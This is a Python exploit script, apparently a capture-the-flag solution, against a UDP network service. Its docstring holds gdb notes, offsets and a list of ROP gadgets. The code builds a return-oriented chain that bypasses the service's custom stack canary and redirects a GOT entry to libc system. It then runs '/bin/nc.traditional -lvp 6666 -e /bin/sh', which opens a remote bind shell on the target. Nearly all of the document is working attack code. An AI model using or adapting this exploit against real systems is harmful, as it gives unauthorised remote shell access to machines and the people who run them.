#!/usr/bin/env python
import sys
import socket
import struct
 
"""
distance to vdso.__kernel_vsyscall on the unpacked binary
(gdb) p __kernel_vsyscall
$1 = {<text variable, no debug info>} 0xb7821414 <__kernel_vsyscall>
 
(gdb) p write
$2 = {<text variable, no debug info>} 0xb78079c0 <write>
 
(gdb) p 0xb7821414 - 0xb78079c0
$3 = 105044
 
packed binary:
0x39A54
 
space for commandline string:
gdb-peda$ x/100wx 0x8063184+0x200
0x8063384:  0x00000000  0x00000000  0x00000000  0x00000000
0x8063394:  0x00000000  0x00000000  0x00000000  0x00000000
0x80633a4:  0x00000000  0x00000000  0x00000000  0x00000000
0x80633b4:  0x00000000  0x00000000  0x00000000  0x00000000
0x80633c4:  0x00000000  0x00000000  0x00000000  0x00000000
0x80633d4:  0x00000000  0x00000000  0x00000000  0x00000000
...
 
some useful gadgets:
0x08048c8e: add dword ptr [ebx + 0x5d5b04c4], eax; ret; 
0x0805ce50: add dword ptr [edi], ecx; test byte ptr [ecx], dl; ret; 
0x0805d141: add dword ptr [edi], ecx; test byte ptr [edi], ch; ret; 
0x0805d165: add dword ptr [edi], ecx; test dl, ah; ret;
 
0x08061f90: pop eax; add byte ptr cs:[ebp + eax*8 + 0xc], bl; add al, 4; ret; 
0x08060e98: pop ebp; cld; leave; ret; 
0x08048c93: pop ebp; ret; 
0x08048c92: pop ebx; pop ebp; ret; 
0x08048f83: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0804880c: pop ebx; ret; 
0x08048f85: pop edi; pop ebp; ret; 
0x08048f84: pop esi; pop edi; pop ebp; ret; 
0x0805d2e0: pop esp; ret 0xfffe; 
0x080612d8: pop esp; rol dword ptr [eax + ecx], 0; ret 0x804; 
 
0x0805d1d8: xchg ah, dh; ret; 
0x0805ff43: xchg dword ptr [ecx - 0x1600016a], ecx; ret 0xfee6; 
0x0805d387: xchg eax, ebx; mov edx, 0xf000000; test dword ptr [edi], edi; ret 0xfffe; 
0x0805d2d4: xchg eax, ebx; mov edx, 0xf000000; test esi, edx; ret 0xfffe; 
0x080581f9: xchg eax, ecx; ret; 
0x080614f0: xchg eax, esp; ret 0x805; 
0x080581d0: xchg eax, esp; ret 0xffff; 
0x0805d1e3: xchg ecx, ebp; ret; 
0x08049420: xchg edx, esi; ret;
 
sum value/write block:
    0x08048c92: pop ebx; pop ebp; ret;
    0xADDR - 0x5d5b04c4
    0xDATA
    0x0805d1e3: xchg ecx, ebp; ret;
    0x080581f9: xchg eax, ecx; ret; 
    0x08048c8e: add dword ptr [ebx + 0x5d5b04c4], eax; ret;
 
"""
 
 
 
def p(v):
    return struct.pack('<L', v)
 
# create a rop wich writes string(s) to address(addr)
def rop_cpystr(addr, s):
    rop = ''
    for i in range(len(s) / 4):
        rop += p(0x08048c92) # pop ebx; pop ebp; ret;
        rop += p(((addr+(i*4)) - 0x5d5b04c4) & 0xFFFFFFFF) # address
        rop += s[(i*4) : (i*4) + 4] # data
        rop += p(0x0805d1e3) # xchg ecx, ebp; ret;
        rop += p(0x080581f9) # xchg eax, ecx; ret;
        rop += p(0x08048c8e) # add dword ptr [ebx + 0x5d5b04c4], eax; ret;
    return rop
 
# create a rop that adds a value(v) to the value at address(addr)
def rop_addvalue(addr, v):
    rop = ''
    rop += p(0x08048c92) # pop ebx; pop ebp; ret;
    rop += p((addr - 0x5d5b04c4) & 0xFFFFFFFF) # address
    rop += p(v)
    rop += p(0x0805d1e3) # xchg ecx, ebp; ret;
    rop += p(0x080581f9) # xchg eax, ecx; ret;
    rop += p(0x08048c8e) # add dword ptr [ebx + 0x5d5b04c4], eax; ret;
    return rop
 
# main exploit code
def main(host, port):
    __popr          = 0x08048f86
    __bss           = 0x08063384
    __setrlimit_got = 0x080632A8
    __jmp_setrlimit = 0x080488E0
    __write_got     = 0x080632D0
    __jmp_write     = 0x08048980
    # 2084 bytes, retn @ 28+
    # 0x8060e1b:    lea    esp,[ebp-0xc]
    # 0x8060e1e:    pop    ebx
    # 0x8060e1f:    pop    esi
    # 0x8060e20:    pop    edi
    # 0x8060e21:    pop    ebp
    rop  = 12 * 'A' # [ebp-0Ch]
    rop += p(0) # ebx
    rop += p(0) # esi
    rop += p(0) # edi
    rop += p(0) # ebp
    # increment setrlimit + 0xC1DD0 -> libc.system
    rop += rop_addvalue(__setrlimit_got, 0xC1DD0)
    # increment write + 0x39A54 -> vdso.__kernel_vsyscall
    rop += rop_addvalue(__write_got, 0x39A54)
    # write the netcat command string to .bss
    rop += rop_cpystr(__bss, '/bin/nc.traditional -lvp 6666 -e /bin/sh')
    # system('netcat command')
    rop += p(__jmp_setrlimit)
    rop += p(__popr)
    rop += p(__bss)
    rop += p(0x43434343)
    # padd till 2080 bytes
    rop  = rop.ljust(2080, 'A')
    # jmp to vdso.__kernel_vsyscall
    rop += p(__jmp_write)
 
    # construct the payload packet
    payload =  64 * 'A'
    payload += '-OO-' # <= canarie 1
    payload += rop
    payload += '-OO-' # <= canarie 2, must match canarie 1 to bypass the stack smashing detection!
 
 
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        client.sendto('\x1f\x0e\xff\xff' +  payload, (host, int(port)))
    except KeyboardInterrupt:
        client.close()
        return
 
if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])
